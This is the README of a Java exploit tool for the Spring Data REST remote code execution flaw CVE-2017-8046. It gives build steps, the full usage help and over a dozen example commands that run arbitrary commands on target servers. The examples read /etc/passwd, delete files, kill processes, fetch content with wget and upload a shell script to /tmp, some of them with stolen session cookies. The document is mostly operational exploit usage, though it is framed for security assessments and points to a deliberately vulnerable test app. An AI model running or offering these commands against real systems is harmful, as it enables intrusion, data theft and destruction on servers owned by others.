# spring-break_cve-2017-8046

This is a Java program that exploits **Spring Break** vulnerability (**CVE-2017-8046**).

This software is written to have as less external dependencies as possible.

## DISCLAIMER

**This tool is intended for security engineers and appsec guys for security assessments. Please use this tool responsibly. I do not take responsibility for the way in which any one uses this application. I am NOT responsible for any damages caused or any crimes committed by using this tool.**

## Vulnerability info

* **CVE-ID**: CVE-2017-8046
* **Link**: [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8046](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8046)
* **Description**: Malicious *PATCH* requests submitted to *spring-data-rest* servers in **Pivotal Spring Data REST** versions prior to **2.5.12**, **2.6.7**, **3.0 RC3**, **Spring Boot** versions prior to **2.0.0M4**, and **Spring Data** release trains prior to **Kay-RC3** can use specially crafted JSON data to run arbitrary Java code.
* **Vendor link**: [https://pivotal.io/security/cve-2017-8046](https://pivotal.io/security/cve-2017-8046)

## How to generate an executable JAR

Here some steps to follow in order to generate an executable JAR, with all dependencies into it, that can be used to launch the exploit.

### with Maven

Following Maven command can be launched:

```
mvn clean compile package
```

### with Eclipse

Following steps can be done:
1. solve all external dependencies/libraries;
1. right click on the Eclipse project and go to `Run As > Run Configurations`;
1. right click on `Java Application` then on `New`;
1. choose a name and set the main class to `com.afs.exploit.spring.SpringBreakCve20178046`;
1. click on `Apply` button;
1. close the window and go back to the main Eclipse window;
1. right click on the Eclipse project and click on `Export...`;
1. find and choose `Runnable JAR file` (under `Java` branch);
1. in the following window:
   1. choose the correct `Launch configuration` created before;
   1. choose an `Export destination`;
   1. choose the option `Extract required libraries into generated JAR`;
   1. click on `Finish` button.

## Help

```
Usage:
   java -jar spring-break_cve-2017-8046.jar [options]
Description:
   Exploiting 'Spring Break' Remote Code Execution (CVE-2017-8046).
Options:
   -h, --help
      Prints this help and exits.
   -u, --url [target_URL]
      The target URL where the exploit will be performed.
      You have to choose an existent resource.
   -cmd, --command [command_to_execute]
      The command that will be executed on the remote machine.
   -U, --upload [file_to_upload]
      File to upload to the remote machine. Will be uploaded to the current working
      directory of the java process. Warning: this will only succeed on a server running
      JRE-1.7 or later.
   --remote-upload-directory [/some/existing/path/]
      Optional. Server will attempt to write the uploaded file to this directory on the
      filesystem. Specified directory must exist and be writeable.
   --cookies [cookies]
      Optional. Cookies passed into the request, e.g. authentication cookies.
   -H, --header [custom_header]
      Optional. Custom header passed into the request, e.g. authorization header.
   -k
      Skip SSL validation
   --clean
      Optional. Removes error messages in output due to the usage of the
      exploit. It could hide error messages if the request fails for other reasons.
   --error-stream
      Optional. In case of errors the command will fail and the error stream will
      not be returned. This option can be used to relaunch the remote command
      returning the error stream.
   -v, --verbose
      Optional. Increase verbosity.
```


## Examples

```
java -jar spring-break_cve-2017-8046.jar --url "https://vuln01.foo.com/api/v1/entity/123" --command ipconfig
```

```
java -jar spring-break_cve-2017-8046.jar --url "https://vuln02.foo.com/api/v2/entity/42" --command ipconfig --cookies "JSESSIONID=qwerty0123456789"
```

```
java -jar spring-break_cve-2017-8046.jar -v --url "https://vuln02.foo.com/api/v2/entity/42" --upload file.sh --remote-upload-directory /tmp
```

```
java -jar spring-break_cve-2017-8046.jar --url "https://vuln03.foo.com/asd/api/v1/entity/1" --command dir --cookies "JSESSIONID=qwerty0123456789;foo=bar"
```

```
java -jar spring-break_cve-2017-8046.jar --url "https://vuln04.foo.com/asd/api/v1/entity/1" --command "dir C:\Windows" --clean
```

```
java -jar spring-break_cve-2017-8046.jar --url "https://vuln05.foo.com/asd/api/v1/entity/1" --command "copy /b NUL ..\..\pwned.txt" --clean
```

```
java -jar spring-break_cve-2017-8046.jar --url "https://vuln06.foo.com/asd/api/v1/entity/1" --command "ping -c 3 www.google.it" --clean
```

```
java -jar spring-break_cve-2017-8046.jar --url "https://vuln07.foo.com/asd/api/v1/entity/1" --command "ps aux" --clean
```

```
java -jar spring-break_cve-2017-8046.jar --url "https://vuln08.foo.com/asd/api/v1/entity/1" --command "uname -a" --clean
```

```
java -jar spring-break_cve-2017-8046.jar --url "https://vuln09.foo.com/asd/api/v1/entity/1" --command "ls -l" --clean
```

```
java -jar spring-break_cve-2017-8046.jar --url "https://vuln10.foo.com/asd/api/v1/entity/1" --command "wget https://www.google.com" --clean
```

```
java -jar spring-break_cve-2017-8046.jar --url "https://vuln11.foo.com/asd/api/v1/entity/1" --command "rm index.html" --clean
```

```
java -jar spring-break_cve-2017-8046.jar --url "https://vuln12.foo.com/asd/api/v1/entity/1" --command "cat /etc/passwd" --clean
```

```
java -jar spring-break_cve-2017-8046.jar --url "https://vuln13.foo.com/asd/api/v1/entity/1" --command "kill -9 5638" --clean
```

Please note that the referenced resource/URL must exist!

## Vulnerable application

A vulnerable application can be found [here](https://github.com/m3ssap0/SpringBreakVulnerableApp).

## Authors

* **Antonio Francesco Sardella** - *main implementation* - [m3ssap0](https://github.com/m3ssap0)
* **Yassine Tioual** - *HTTP header enhancement* - [nisay759](https://github.com/nisay759)
* **Robin Wagenaar** - *for the suggestion to use patch operation 'remove' instead of 'replace' and for the file upload functionality* - [RobinWagenaar](https://github.com/RobinWagenaar)

## License

This project is licensed under the Apache License Version 2.0 - see the **LICENSE.txt** file for details.

## Acknowledgments

* [Man Yue Mo](https://lgtm.com/blog/spring_data_rest_CVE-2017-8046_ql) the security researcher who discovered the vulnerability